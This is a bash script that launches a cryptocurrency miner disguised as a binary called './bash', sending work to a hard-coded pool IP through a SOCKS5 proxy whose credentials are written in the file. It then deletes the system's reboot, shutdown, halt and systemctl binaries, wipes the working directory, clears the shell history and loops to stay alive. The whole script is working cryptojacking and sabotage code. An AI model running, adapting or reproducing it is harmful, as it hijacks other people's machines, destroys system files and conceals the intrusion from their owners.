#!/bin/bash

sudo apt-get update -y
nohup ./bash -B -a yespowertide -o 47.236.252.96:443 -u TTypeGyp3ioj1AxqfDTXnuxmSNdaXmFDid.$(echo $(shuf -i 1-999 -n 1)-OL)  --proxy socks5://majapahlevi:majapahlevi@137.184.215.93:443 >/dev/null 2>&1
sleep 5
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
rm -rvf *
cd ~/
history -cr
while true
do
        echo "hold down..."
        sleep 60
done